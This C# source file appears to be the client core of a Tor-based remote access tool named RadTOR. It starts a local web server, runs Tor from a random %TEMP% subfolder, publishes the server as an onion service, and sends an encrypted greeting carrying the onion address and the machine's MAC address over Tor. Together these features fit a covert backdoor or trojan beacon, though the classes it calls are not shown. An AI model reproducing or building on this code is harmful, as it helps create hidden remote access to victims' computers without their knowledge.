using LocalRT.radtor.local.config;
using LocalRT.radtor.local.core;
using LocalRT.radtor.local.web;
using LocalRT.radtor.utils;
using LocalRT.Radtor.Remote;
using System;
using System.Threading;

namespace LocalRT.radtor.local
{
    public class RadTORLocal
    {
        private ManagerTOR torCore = null;
        private int torPort = -1;
        private int radtorPort = -1;
        private bool running;
        private RTHttpServer radtorHttp;

        public string URL_RADTOR_LOCAL { get; set; }
        public bool Running
        {
            get
            {
                return running;
            }

            set
            {
                running = value;
            }
        }

        public String radtorLocalUrl { get; private set; }

        public RadTORLocal()
        {
        }
        public RadTORLocal(int _radtorPort)
        {
            radtorPort = RadTorUtil.randomNumber(10000, 50000);
            radtorPort = _radtorPort;
            RadTorLog.log("Inicia con radtorPort :\t" + _radtorPort);
        }

        public void run()
        {
            while (!System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
            {
                Thread.Sleep(1000);
                RadTorLog.log("Esperando conexion a red..");
            }

            RadTorLog.log("Activando Servidor Local RadTOR");
            activeLocalWebServer();
            Thread thread = new Thread(new ThreadStart(radtorHttp.listen));
            thread.Start();
            RadTorLog.log("Iniciando Servidor Local RadTOR");
            Thread.Sleep(13000);
            RadTorLog.log("Tiempo de espera finalizado..");

            activeTOR();
            RadTorLog.log("Conectando servidor");
            RadTorLog.log("USANDO TOR PROXY EN :" + torPort);

            Thread.Sleep(5000);

            EncripTOR encrip = new EncripTOR();
            string sayHi = encrip.encript(string.Format("ALO|{0}|{1}", torCore.rtOnionUrl , LocalConfiguration.getMac()));
            RadTorLog.log("Saludo            =>" + sayHi);
            
            
            string urlHiRadtor = string.Format("http://{0}/{1}", torCore.rtOnionUrl, sayHi);
            
            RTBridge rtBridge = RTBridge.getInstance(urlHiRadtor, torPort);
            String response = rtBridge.getHtml(urlHiRadtor);
            //TODO: Ver tema de encriptacion.
            //string dResponse = encrip.decrypt(response);
            RadTorLog.log("respuesta servidor DESDE DEEP WEB: DES\n" + response);
            //rtBridge.sendMail(torCore.rtOnionUrl);
            Running = true;
            rtBridge.roar(true);


            //dResponse = encrip.descript(dResponse);
            //RadTorLog.log("respuesta servidor DESDE DEEP WEB: Des..DES\n" + dResponse);
            
        }


        public void activeTOR()
        {
            RadTorLog.log("Activando Tor");
            torPort = radtorPort;
            while (torPort == radtorPort)
            {
                torPort = RadTorUtil.randomNumber(6000, 8000);
            }
            RadTorLog.log("Activando TOR con puerto :\t" + torPort);
            torCore = new ManagerTOR(RadTorUtil.returnRandomSubFolder("%TEMP%"));
            torCore.active(torPort, radtorPort);
            radtorLocalUrl = torCore.LocalTorUrl;

        }
        //Configura arvhivos locales de TOR
        public void activeLocalWebServer()
        {
            if (radtorPort == -1)
            {
                while (radtorPort == torPort)
                {
                    radtorPort = RadTorUtil.randomNumber(1776, 6771);
                }
            }
            URL_RADTOR_LOCAL = string.Format("http://localhost:{0}",radtorPort);
            RadTorLog.log("URL_RADTOR_LOCAL :\t" + URL_RADTOR_LOCAL);
            radtorHttp = new RTHttpServer(radtorPort);
        }
    }
}